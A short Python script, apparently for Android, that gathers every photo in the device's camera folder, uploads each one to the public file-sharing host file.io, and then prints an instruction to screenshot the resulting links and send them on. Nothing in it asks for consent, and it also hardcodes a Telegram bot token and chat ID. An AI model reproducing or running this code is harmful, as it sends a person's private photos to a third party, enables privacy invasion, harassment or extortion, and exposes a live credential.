import os,requests,time
from datetime import datetime

BOT_TOKEN="8200691947:AAF-wOE90vTafT21Hqzs5WXokd2iBVstdl4"
CHAT_ID="8519296209"
CAMERA="/storage/emulated/0/DCIM/Camera"

def upload_to_fileio(file_path):
    try:
        with open(file_path,'rb') as f:
            r=requests.post('https://file.io', files={'file': f})
            d=r.json()
            if d['success']:
                return d['link']
    except:
        return None
    return None

print("Searching for photos...")
p=[os.path.join(CAMERA,f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png'))]
print(f"Found {len(p)} photos")

links=[]
for i,photo in enumerate(p,1):
    print(f"Uploading {i}/{len(p)}...")
    link=upload_to_fileio(photo)
    if link:
        links.append(f"{os.path.basename(photo)}:{link}")
        print(f"OK {link}")
    else:
        print(f"FAIL {os.path.basename(photo)}")
    time.sleep(2)

if links:
    out="/storage/emulated/0/Download/links.txt"
    with open(out,'w') as f:
        for l in links:
            f.write(l+'\n')
    print(f"Links saved to {out}")
    print("\nSCREENSHOT THIS PAGE AND SEND IT")
    print("\nLinks list:")
    for i,l in enumerate(links,1):
        print(f"{i}. {l}")
else:
    print("No links")

print("Done")
